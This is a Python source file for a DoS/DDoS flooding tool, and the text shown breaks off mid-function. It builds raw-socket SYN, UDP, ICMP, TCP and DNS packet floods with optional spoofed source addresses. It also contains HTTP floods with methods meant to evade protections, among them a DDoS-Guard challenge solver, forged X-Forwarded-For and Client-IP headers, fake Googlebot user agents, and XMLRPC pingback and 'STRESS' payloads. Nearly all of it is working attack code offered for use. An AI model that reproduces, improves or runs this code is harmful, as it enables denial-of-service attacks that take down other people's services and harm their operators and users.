from contextlib import suppress
from itertools import cycle
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue, Process
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice
from ssl import CERT_NONE, SSLContext, create_default_context
from sys import argv
from sys import exit as _exit
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from requests import Response, Session, cookies
from yarl import URL
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname, socket)

import sys
import os
import multiprocessing
import ctypes


basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S", stream=sys.stdout, encoding='utf-8')
logger = getLogger("DoS/DDoS Attacks")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__dir__: Path = Path(__file__).parent
__ip__: Any = None


with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]

def checkRawSocket():
    with suppress(OSError):
        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
            return True
    return False

def exit(*message):
    if message:
        logger.error(message)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW",
        "NULL", "COOKIE", "PPS", "GSB", "DGB", "AVB", "CFBUAM",
        "XMLRPC", "BOT", "DOWNLOADER", "RHEX"
    }

    LAYER4_METHODS: Set[str] = {
        "TCP", "UDP", "SYN", "ICMP", "DNS", "CPS", "CONNECTION", "FIVEM"
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

BYTES_LIMIT = 0



class Tools:
    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile('"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT, BYTES_LIMIT
        #print("send")
        if BYTES_SEND.__int__() > BYTES_LIMIT:
            return False
        sock.send(packet)
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT, BYTES_LIMIT
        if BYTES_SEND.__int__() > BYTES_LIMIT:
            return False
        sock.sendto(packet, target)
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

class Layer4(Process):
    _method: str
    _target: Tuple[str, int]
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _spoofing: str

    def __init__(self,
                 target: Tuple[str, int],
                 method: str = "TCP",
                 synevent: multiprocessing.Event = None,
                 spoofing: str = None):
        Process.__init__(self)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._method = method
        self._target = target
        self._synevent = synevent
        self._spoofing = spoofing

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "DNS": self.DNS,
            "FIVEM": self.FIVEM,
            "CPS": self.CPS,
            "ICMP":self.ICMP,
            "TCP":self.TCP,
            "CONNECTION": self.CONNECTION,
        }

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        packet = self.make_packet(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD(packet)

    def make_packet(self, name: str):
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

        for value in self.methods.items():
            if name == "SYN":
                payload = self._genrate_syn()
                return payload
            elif name == "TCP":
                payload = self._genrate_tcp()
                return payload
            elif name == "UDP":
                payload = self._genrate_udp()
                return payload
            elif name == "ICMP":
                self._target = (self._target[0], 0)
                payload = self._genrate_icmp()
                return payload
            elif name == "DNS":
                payload = self._generate_dns()
                return payload
            elif name == "CPS":
                return None
            elif name == "CONNECTION":
                return None
            elif name == "FIVEM":
                payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
                return payload


    def open_connection(self):
        s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
        s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        s.setblocking(0)
        s.settimeout(0)
        s.connect(self._target)
        return s

    def CPS(self, payload) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection() as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def CONNECTION(self, payload) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection() as s:
            REQUESTS_SENT += 1
            while s.recv(1):
                continue
            REQUESTS_SENT -= 1
        Tools.safe_close(s)

    def TCP(self, payload) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            s.setblocking(0)
            s.settimeout(0)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def UDP(self, payload) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            s.setblocking(0)
            s.settimeout(0)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def ICMP(self, payload) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            s.setblocking(0)
            s.settimeout(0)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self, payload) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            s.setblocking(0)
            s.settimeout(0)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def DNS(self, payload) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            s.setblocking(0)
            s.settimeout(0)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self, payload) -> None:
        global BYTES_SEND, REQUESTS_SENT
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _genrate_tcp(self) -> bytes:
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.contains(Data(randbytes(1024)))
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_udp(self) -> bytes:
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        ud: UDP = UDP()
        ud.set_uh_dport(self._target[1])
        ud.set_uh_sport(ProxyTools.Random.rand_int(32768, 65535))
        ud.contains(Data(randbytes(1024)))
        ip.contains(ud)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_dns(self):
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])

        ud: UDP = UDP()
        dns_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
        ud.set_uh_dport(self._target[1])
        ud.set_uh_sport(dns_payload[1])

        ud.contains(Data(dns_payload[0]))
        ip.contains(ud)
        return ip.get_packet()


class Layer7(Process):
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any
    _spoofing: str

    def __init__(self,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 spoofing: str = None,
                 synevent: multiprocessing.Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None) -> None:
        Process.__init__(self)
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._spoofing = spoofing
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "DOWNLOADER": self.DOWNLOADER,
            "PPS": self.PPS,
            }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
                
    def run(self) -> None:
        #print("Start RUN")
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        packet = None
        packet = self.make_packet(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD(packet)

    def make_packet(self, name: str):
        for key in self.methods.items():
            if name == "PPS":
                payload: Any = str.encode(self._defaultpayload +
                                  f"Host: {self._target.authority}\r\n\r\n")
                return payload
            elif name == "GET":
                #print("Make packet")
                payload: bytes = self.generate_payload()
                return payload
            elif name == "POST":
                payload: bytes = self.generate_payload(
                                        ("Content-Length: 44\r\n"
                                        "X-Requested-With: XMLHttpRequest\r\n"
                                        "Content-Type: application/json\r\n\r\n"
                                        '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
                return payload
            elif name == "OVH":
                payload: bytes = self.generate_payload()
                return payload
            elif name == "AVB":
                payload: bytes = self.generate_payload()
                return payload
            elif name == "CFB":
                return None
            elif name == "DGB":
                return None
            elif name == "BOT":
                payload: bytes = self.generate_payload()
                return payload
            elif name == "GSB":
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                                    "Host: %s\r\n" % self._target.authority +
                                    self.randHeadercontent +
                                    'Accept-Encoding: gzip, deflate, br\r\n'
                                    'Accept-Language: en-US,en;q=0.9\r\n'
                                    'Cache-Control: max-age=0\r\n'
                                    'Connection: Keep-Alive\r\n'
                                    'Sec-Fetch-Dest: document\r\n'
                                    'Sec-Fetch-Mode: navigate\r\n'
                                    'Sec-Fetch-Site: none\r\n'
                                    'Sec-Fetch-User: ?1\r\n'
                                    'Sec-Gpc: 1\r\n'
                                    'Pragma: no-cache\r\n'
                                    'Upgrade-Insecure-Requests: 1\r\n\r\n')
                return payload
            elif name == "DYN":
                payload: Any = str.encode(self._payload +
                                        f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                        self.randHeadercontent +
                                        "\r\n")
                return payload
            elif name == "RHEX":
                randhex = str(randbytes(randchoice([32, 64, 128])))
                payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                                    "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                                    self.randHeadercontent +
                                    'Accept-Encoding: gzip, deflate, br\r\n'
                                    'Accept-Language: en-US,en;q=0.9\r\n'
                                    'Cache-Control: max-age=0\r\n'
                                    'Connection: keep-alive\r\n'
                                    'Sec-Fetch-Dest: document\r\n'
                                    'Sec-Fetch-Mode: navigate\r\n'
                                    'Sec-Fetch-Site: none\r\n'
                                    'Sec-Fetch-User: ?1\r\n'
                                    'Sec-Gpc: 1\r\n'
                                    'Pragma: no-cache\r\n'
                                    'Upgrade-Insecure-Requests: 1\r\n\r\n')
                return payload
            elif name == "SLOW":
                payload: bytes = self.generate_payload()
                return payload
            elif name == "NULL":
                payload: Any = str.encode(self._payload +
                                        f"Host: {self._target.authority}\r\n" +
                                        "User-Agent: null\r\n" +
                                        "Referrer: null\r\n" +
                                        self.SpoofIP + "\r\n")
                return payload
            elif name == "XMLRPC":
                payload: bytes = self.generate_payload(
                                        ("Content-Length: 345\r\n"
                                        "X-Requested-With: XMLHttpRequest\r\n"
                                        "Content-Type: application/xml\r\n\r\n"
                                        "<?xml version='1.0' encoding='iso-8859-1'?>"
                                        "<methodCall><methodName>pingback.ping</methodName>"
                                        "<params><param><value><string>%s</string></value>"
                                        "</param><param><value><string>%s</string>"
                                        "</value></param></params></methodCall>") %
                                        (ProxyTools.Random.rand_str(64),
                                        ProxyTools.Random.rand_str(64)))[:-2]
                return payload
            elif name == "STRESS":
                payload: bytes = self.generate_payload(
                                        ("Content-Length: 524\r\n"
                                        "X-Requested-With: XMLHttpRequest\r\n"
                                        "Content-Type: application/json\r\n\r\n"
                                        '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
                return payload
            elif name == "CFBUAM":
                payload: bytes = self.generate_payload()
                return payload
            elif name == "BYPASS":
                return None
            elif name == "COOKIE":
                payload: bytes = self.generate_payload(
                                "Cookie: _ga=GA%s;"
                                " _gat=1;"
                                " __cfduid=dc232334gwdsd23434542342342342475611928;"
                                " %s=%s\r\n" %
                                (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
                                ProxyTools.Random.rand_str(32)))
                return payload
            elif name == "DOWNLOADER":
                payload: Any = self.generate_payload()
                return payload
    

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')


    def generate_payload_orig(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def generate_payload(self, other: str = None) -> bytes:
        #print("-------Generate payload")
        if self._target.scheme.lower() == "https":
            self._spoofing = "False"

        http_payload = str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))
        ip: IP = IP()
        if (self._spoofing=="TRUE"):
            ip.set_ip_src(ProxyTools.Random.rand_ipv4())
        else:
            ip.set_ip_src(__ip__)
        #print(ip.get_ip_src())
        ip.set_ip_dst(self._target.host)
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target.port)
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        tcp.contains(Data(http_payload))
        ip.contains(tcp)
        return ip.get_packet()

    def open_connection(self, host=None) -> socket:
        sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.setblocking(0)
        sock.settimeout(0)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    def my_open_connection(self, host=None) -> socket:
        sock = None
        if self._target.scheme.lower() == "https":
            sock = socket(AF_INET, SOCK_STREAM)
            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            sock.settimeout(0.3)
        else:     
            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            sock.settimeout(0)
            sock.setblocking(0)
        sock.connect(host or self._raw_target)
        #host = None
        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock,
                                   server_hostname=host[0] if host else self._target.host,
                                   server_side=False,
                                   do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)      
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH",
                                            "DYN", "SLOW", "PPS", "BOT", "RHEX"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB"} \
            else "REQUESTS"

    def POST(self, payload) -> None:
        s = None
        #with suppress(Exception), self.my_open_connection(target) as s:
        with self.my_open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)

    def GET(self, payload) -> None:
        s = None
        with self.my_open_connection() as s:
            for _ in range(self._rpc):
                #Tools.sendto(s, payload, self._raw_target)
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self, payload) -> None:
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
